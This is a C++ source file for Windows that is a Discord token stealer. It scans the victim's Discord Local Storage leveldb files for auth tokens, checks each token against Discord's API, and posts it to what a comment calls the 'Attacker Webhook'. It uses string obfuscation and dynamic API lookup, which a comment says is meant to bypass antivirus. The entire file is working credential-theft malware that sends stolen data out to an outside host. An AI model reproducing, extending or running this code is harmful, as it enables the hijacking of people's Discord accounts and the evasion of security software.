#include "Core.h" 

// Define Functions

std::string GetToken(std::string path)
{
    // Get Handle From File

    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, GetFileAttributesA(path.c_str()), NULL);

    DWORD FileSize = GetFileSize(hFile, NULL); // GetFileSize

    // Allocate Memory And Read Data

    CHAR* buffer = (CHAR*)VirtualAlloc(NULL, FileSize, MEM_COMMIT, PAGE_READWRITE);

    ReadFile(hFile, buffer, FileSize, NULL, NULL);
    CloseHandle(hFile); // CloseHandle

    CHAR* Fixed = (CHAR*)malloc(FileSize);

    // Clean Data ( Remove useless Chars ) 

    Fixed = ReplaceALL(buffer, FileSize);

    std::string str_data = Fixed;

    // Check if file have an token

    if (!strstr(str_data.c_str(), "oken"))
    {
        return "null";
    }

    // Search For Token

    std::string token = Find(str_data);

    return token;
}

LPSTR Check(LPSTR ch, CHAR x)
{
    do
    {
        if (*ch == x) return ch;
    } while (ch++);
    return NULL;
}

LPSTR ReplaceALL(LPSTR data, DWORD bytes) {

    CHAR* allowed_chars = (CHAR*)xorstr_("1234567890.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_");
    LPSTR removeBinary = (LPSTR)malloc(bytes);

    for (DWORD i = 1; i < bytes; i++)
    {
        if (Check(allowed_chars, data[i]) == NULL || data[i] == '\0')
        {
            removeBinary[i] = ' ';
        }
        else
        {
            removeBinary[i] = data[i];
        }

    }

    return removeBinary;
}

std::string Find(std::string content)
{
    DWORD pos1 = content.find("oken");
    std::string part1 = content.substr(pos1);

    DWORD pos2 = part1.find("\"");
    std::string part2 = part1.substr(pos2);

    DWORD Final = part2.find("\"");
    std::string Token = part2.substr(Final);

    std::string tok = "";

    Final += 1;

    for (size_t i = Final; i < Final + 59; i++)
    {
        tok = tok + Token[i];
    }

    return tok;
}

BOOL CheckToken(std::string token)
{
    // Check Token Validity

    CHAR* Headers = (CHAR*)malloc(100);
    ZeroMemory(Headers, 100);
    strcat(Headers, "Authorization: ");
    strcat(Headers, token.c_str());

    HINTERNET Init = InternetOpenA(fucker.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET Conn = InternetConnectA(Init, "canary.discord.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
    HINTERNET Req = HttpOpenRequestA(Conn, "GET", "/api/v8/users/@me", "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE, 0);
    BOOL Send = HttpSendRequestA(Req, Headers, strlen(Headers), 0, 0);

    if (Send == TRUE)
    {
        CHAR* RET = (CHAR*)malloc(11);
        ZeroMemory(RET, 11);
        DWORD RET_SZ = 11;

        HttpQueryInfoA(Req, HTTP_QUERY_STATUS_CODE, RET, &RET_SZ, NULL);

        if (strcmp(RET, "200") == 0)
        {
            InternetCloseHandle(Req);
            InternetCloseHandle(Conn);
            InternetCloseHandle(Init);
            return TRUE;
        }
    }

    InternetCloseHandle(Req);
    InternetCloseHandle(Conn);
    InternetCloseHandle(Init);

    return FALSE;
}

void SendRequest(std::string t, unsigned int valid)
{

    std::string new_webhook = webhook;

    // Repair Webhook

    if (strstr(new_webhook.c_str(), "https://discord.com"))
    {
        new_webhook = new_webhook.replace(new_webhook.find("https://discord.com"), 19, "");
    }

    // Send Token To Attacker Webhook

    CHAR* szHeaders = (CHAR*)"Content-Type:application/json\r\n"; // Headers
    CHAR* szPostData = (CHAR*)"{\"content\":\" New Token\\nValid = False```{tok}```\"}"; // PostData

    std::string post = szPostData;
    if (valid == 1)
    {
        post = post.replace(post.find("False"), 5, "True");
    }

    post = post.replace(post.find("{tok}"), 5, t);
    CHAR* Fin = (CHAR*)post.c_str();

    HINTERNET Init = InternetOpenA(fucker.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET Conn = InternetConnectA(Init, "discord.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
    HINTERNET Req = HttpOpenRequestA(Conn, "POST", new_webhook.c_str(), "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE, 0);
    BOOL Send = HttpSendRequestA(Req, szHeaders, strlen(szHeaders), Fin, strlen(Fin));
    InternetCloseHandle(Req);
    InternetCloseHandle(Conn);
    InternetCloseHandle(Init);
}

void OriginalThread()
{
    // Get Address Of GetUserNameA Function ( Bypass Antivirus )

    _GUA LPGUA = (_GUA)GetProcAddress(LoadLibraryA(xorstr_("ADVAPI32.dll")), xorstr_("GetUserNameA"));

    char UseR[200];
    RtlZeroMemory(UseR, 200);
    DWORD LongLongPointer = 200;

    BOOL Hello = LPGUA(UseR, &LongLongPointer); // Invoke GetUserNameA Function
    std::string STR_User = UseR;

    // Define Discord Path

    std::string dir = xorstr_("C:\\Users\\") + STR_User + xorstr_("\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\");

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    CHAR* SSTR = (CHAR*)malloc(MAX_PATH);
    ZeroMemory(SSTR, MAX_PATH);

    memcpy(SSTR, dir.c_str(), dir.length() + 1);
    strcat(SSTR, "*");

    // Find The First File

    hFind = FindFirstFileA(SSTR, &ffd);

    // Do While Loop FindNextFile ->> FindAllFiles In Directory 

    do
    {
        if (ffd.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
        {
            // Just Get Ldb & Log Files Path
            if (strstr(ffd.cFileName, ".ldb") || strstr(ffd.cFileName, ".log"))
            {
                std::string fullpath = dir + ffd.cFileName;
                std::string MyToken = GetToken(fullpath);
                if (MyToken == "null")
                {
                    continue;
                }
                // Check Token | Send To Server
                if (CheckToken(MyToken) == TRUE)
                    SendRequest(MyToken, 1);
                else
                    SendRequest(MyToken, 0);
            }

        }

    } while (FindNextFileA(hFind, &ffd) != 0); // FindNextFile
}